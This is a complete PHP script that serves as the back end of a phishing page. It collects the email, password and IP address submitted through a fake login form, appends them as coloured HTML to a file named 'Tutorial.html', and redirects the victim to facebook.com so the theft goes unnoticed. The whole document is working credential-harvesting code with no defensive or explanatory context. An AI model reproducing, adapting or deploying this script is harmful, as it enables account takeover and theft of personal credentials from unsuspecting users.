<?php

$habbo = $_POST['email']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("Tutorial.html", "a"); 
fwrite ($f, 'Email: [<b><font color="#0000FF">'.$habbo.'</font></b>] Password: [<b><font color="#FF0040">'.$password.'</font></b>] IP: [<b><font color="#FE2EF7">'.$ip.'</font></b>]<br>');
fclose($f);

header("Location: http://www.facebook.com");
?>
